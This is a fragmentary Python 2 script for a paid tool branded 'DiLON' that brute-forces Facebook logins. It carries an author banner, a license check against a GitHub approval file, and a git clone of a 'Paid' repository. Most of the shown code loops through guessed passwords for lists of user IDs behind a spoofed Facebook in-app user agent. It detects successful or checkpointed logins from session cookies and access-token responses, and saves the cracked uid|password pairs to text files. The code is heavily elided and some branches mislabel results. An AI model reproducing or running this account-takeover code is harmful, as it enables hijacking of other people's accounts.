...
logo = """'
\x1b[1;93m' 8888888b. 8888888 888      .d88888b.  
'\x1b[1;92m'888  "Y88b  888   888     d88P" "Y88b 
'\x1b[1;91m'888    888  888   888     888     888
'\x1b[1;93m'888    888  888   888     888     888
'\x1b[1;91m'888    888  888   888     888     888 
'\x1b[1;91m'888    888  888   888     888     888 
'\x1b[1;93m'888  .d88P  888   888     Y88b. .d88P 
'\x1b[1;91m'8888888P" 8888888 88888888 "Y88888P"  
'\x1b[1;92m'........::..:::::..::........::..:::::..::


'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄DiLON𝙧᭄
'\x1b[1;91m'   Author      ||    DiLO BHAI     
'\x1b[1;92m'   Github      ||     CyberDilo
'\x1b[1;93m'   FB ID       ||    DiLO King
'\x1b[1;94m'   TOOL TYPE   ||    PAID
'\x1b[1;96m'   WAP NUMBER  ||     03154619676          
'\x1b[1;91m' ༄Mr𝙧᭄•─────────────────•༄DiLON𝙧᭄
"""
dec="2"
server="2"
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/DiLOn.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        ...
        os.system("xdg-open https://wa.me/+923154619676")
        
    r1=requests.get("https://github.com/Diloking/DiLo-BHAI/blob/main/Approval.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("        Member In DiLOn Paid Commands ")
        print ("        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/DiLOnXKhan/Paid")
...
def numcloning():
    ...
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄DiLON𝙧᭄"| lolcat')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[DiLON-OK] "+coc+user + " | " + pass1
                ok=open('DiLON-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
    ...
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [DiLON])"
    print 40*'-'
    print ''
...
def mineExt():
    ...
    print g+"[=] Extracting From DiLON : "+my_line[:15]
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[DiLON-OK] "+uid + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[DiLON-OK] "+uid + " | " + pass2
                        ok=open('rsa-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[DiLON-OK] "+uid + " | " + pass3
                                ok=open('rsa-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[DiLON-CP] "+uid + " | " + pass3
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[DiLON-OK] "+uid + " | " + pass4
                                        ok=open('rsa-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[DiLON-CP] "+uid + " | " + pass4
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[DiLON-OK] "+uid + " | " + pass5
                                                ok=open('rsa-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[DiLON-CP] "+uid + " | " + pass5
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
    ...
    print "\033[1;93m NAAM TO SONA HOGAA [DiLON])"
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[DiLON-CP] "+uid + " | " + pass2
                            cp=open('DiLON-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[DiLON-OK] "+uid + " | " + pass3
                                    cp=open('DiLON-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[DiLON-CP] "+uid + " | " + pass5
                                                    cp=open('DiLON-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[DiLON-OK] "+uid + " | " + pass1
                    cp=open('DiLON-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[DiLON-OK] "+uid + " | " + pass2
                            cp=open('DiLON-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[DiLON-CP] "+uid + " | " + pass3
                                    cp=open('DiLON-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[DiLON-CP] "+uid + " | " + pass5
                                                    cp=open('DiLON-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[DiLON-OK] "+uid + " | " + pass6
                                                        ok=open('DiLON-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[DiLON-CP] "+uid + " | " + pass6
                                                            cp=open('DiLON-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
